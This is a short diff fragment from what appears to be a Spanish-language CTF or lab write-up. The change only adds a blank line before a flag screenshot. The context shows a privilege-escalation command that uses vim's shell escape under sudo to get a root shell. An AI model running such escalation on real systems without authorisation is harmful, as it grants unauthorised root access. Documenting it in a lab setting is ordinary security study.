@@ -54,6 +54,7 @@ Se utilizo el escape interactivo de vim para invocar una shell como root:
     $ sudo vim -c ':!/bin/sh'
 
 Comprobacion de privilegios:
+
 ![Vim Flag](/img/vimShot_trust.png)
 
 
